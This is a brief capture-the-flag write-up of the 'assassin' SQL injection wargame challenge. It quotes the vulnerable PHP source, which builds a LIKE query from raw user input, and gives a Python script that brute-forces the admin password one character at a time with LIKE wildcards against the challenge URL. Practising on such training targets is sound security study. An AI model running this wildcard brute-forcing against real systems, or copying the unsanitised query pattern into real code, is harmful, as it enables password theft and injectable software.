
#  ASSASSIN
```
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/\'/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_assassin where pw like '{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("assassin"); 
  highlight_file(__FILE__); 
?>
```
Using %__ to check the password matching to n th character in this case searching for 3 character.


```
import requests
import string
char = string.digits + string.ascii_letters
session = {"PHPSESSID": "543hSou81c4g7dfv96aojdiaa"}
for i in char:
    param = {'pw':f'%__{i}'}
    req = requests.get("https://los.rubiya.kr/chall/assassin_14a11d552c61c601034879e5d4171373.php", params=param, cookies=session)
    if "Hello admin" in req.text:
        print("found", i)
        break
```
***
### query : select id from prob_assassin where pw like '__2%'
***
